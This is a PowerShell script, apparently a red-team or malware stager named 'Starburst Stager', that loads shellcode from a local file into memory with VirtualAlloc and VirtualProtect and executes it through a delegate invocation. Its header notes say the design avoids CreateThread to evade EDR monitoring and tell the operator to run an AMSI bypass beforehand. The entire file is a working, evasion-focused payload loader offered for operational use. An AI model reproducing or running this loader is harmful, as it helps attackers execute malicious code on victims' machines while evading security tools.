# ============================================================================
# Starburst Stager - Delegate Invoke (No CreateThread)
# ============================================================================
# Technique:  VirtualAlloc + VirtualProtect + GetDelegateForFunctionPointer
# OPSEC Notes:
#   - Avoids CreateThread API call, which is monitored by many EDR products.
#   - Execution occurs on the current thread via delegate invocation.
#   - AMSI will still inspect this script. Apply AMSI bypass before execution.
#   - ScriptBlock logging captures the full script.
#   - VirtualAlloc is still called and may be monitored.
#   - The delegate pattern is increasingly known but still less flagged than
#     the CreateThread pattern.
#   - PowerShell Constrained Language Mode will block Add-Type.
# ============================================================================

# --- OPERATOR: Set shellcode path ---
$ShellcodePath = "C:\path\to\starburst.bin"

# Read shellcode from disk
if (-not (Test-Path $ShellcodePath)) {
    Write-Error "Shellcode file not found: $ShellcodePath"
    exit 1
}
[Byte[]]$Shellcode = [System.IO.File]::ReadAllBytes($ShellcodePath)

# P/Invoke definitions
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Win32Delegate {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        uint dwFreeType
    );
}
"@

# Constants
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20

# Allocate RW memory
$Address = [Win32Delegate]::VirtualAlloc(
    [IntPtr]::Zero,
    [uint32]$Shellcode.Length,
    ($MEM_COMMIT -bor $MEM_RESERVE),
    $PAGE_READWRITE
)

if ($Address -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed"
    exit 1
}

# Copy shellcode to allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Address, $Shellcode.Length)

# Clear shellcode from managed memory
[Array]::Clear($Shellcode, 0, $Shellcode.Length)

# Flip memory protection from RW to RX
$OldProtect = 0
$ProtectResult = [Win32Delegate]::VirtualProtect(
    $Address,
    [uint32]$Shellcode.Length,
    $PAGE_EXECUTE_READ,
    [ref]$OldProtect
)

if (-not $ProtectResult) {
    Write-Error "VirtualProtect failed"
    exit 1
}

# Create delegate type and invoke — no CreateThread needed
# This executes the shellcode on the current thread
$DelegateType = [System.Runtime.InteropServices.Marshal].GetType().Assembly.GetType(
    'System.Runtime.InteropServices.Marshal'
).GetMethod('GetDelegateForFunctionPointer', [Type[]]@([IntPtr], [Type]))

# Define a delegate type that matches void function with no arguments
$VoidDelegateType = [System.MulticastDelegate].Assembly.GetType('System.Action')

$Delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $Address,
    [Type]$VoidDelegateType
)

# Invoke the shellcode on the current thread
$Delegate.Invoke()
